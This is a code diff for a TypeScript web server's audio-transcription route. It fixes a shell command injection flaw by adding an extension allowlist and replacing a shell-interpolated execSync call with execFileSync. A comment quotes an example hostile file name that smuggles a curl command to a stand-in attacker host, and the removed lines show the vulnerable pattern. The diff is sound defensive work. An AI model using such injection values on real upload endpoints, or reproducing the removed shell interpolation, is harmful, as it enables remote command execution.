@@ -2,10 +2,23 @@ import { Hono } from "hono";
 import { writeFileSync, unlinkSync, readFileSync } from "node:fs";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
-import { execSync } from "node:child_process";
+import { execFileSync } from "node:child_process";
 import { nanoid } from "nanoid";
 import { db } from "../db.js";
 import type { TelegramUser } from "../auth.js";
+
+/**
+ * Allowlist for uploaded-audio file extensions. Anything outside this set is
+ * rejected with 400. Previous implementation derived `ext` from the raw
+ * `File.name` and interpolated it into a `execSync` shell template, so an
+ * upload named `foo.mp3; curl evil.example` would execute the curl as the
+ * `claude` user. The allowlist + `execFileSync` combination closes both
+ * halves: the ext can only be a safe audio suffix, AND the tmp path is
+ * passed as an argv token so the shell never sees it.
+ */
+const ALLOWED_AUDIO_EXTS = new Set([
+  "mp3", "wav", "ogg", "oga", "webm", "m4a", "mp4", "flac", "aac", "opus",
+]);
 
 // Load OpenAI key from secrets file if not already in env
 function loadOpenAIEnv() {
@@ -54,16 +67,22 @@ app.post("/transcribe", async (c) => {
     return c.json({ error: "No audio file provided" }, 400);
   }
 
-  const ext = (audioFile as File).name?.split(".").pop() || "webm";
-  const tmpPath = join(tmpdir(), `cpc-audio-${nanoid(8)}.${ext}`);
+  const rawExt = ((audioFile as File).name?.split(".").pop() || "webm").toLowerCase();
+  if (!ALLOWED_AUDIO_EXTS.has(rawExt)) {
+    return c.json({ error: `unsupported audio extension: ${rawExt}` }, 400);
+  }
+  const tmpPath = join(tmpdir(), `cpc-audio-${nanoid(8)}.${rawExt}`);
 
   try {
     const arrayBuffer = await (audioFile as File).arrayBuffer();
     writeFileSync(tmpPath, Buffer.from(arrayBuffer));
 
     const transcribeBin = join(process.env.HOME || "/home/claude", "bin/transcribe");
-    const result = execSync(`${transcribeBin} ${tmpPath}`, {
-      shell: "/bin/bash",
+    // execFileSync with argv — no shell. The allowlist above already makes
+    // the ext (and therefore the tmp path) shell-safe, but routing through
+    // execFile is the stronger guarantee: defense-in-depth against any
+    // future regression that might weaken the allowlist.
+    const result = execFileSync(transcribeBin, [tmpPath], {
       encoding: "utf-8",
       env: { ...process.env },
     });
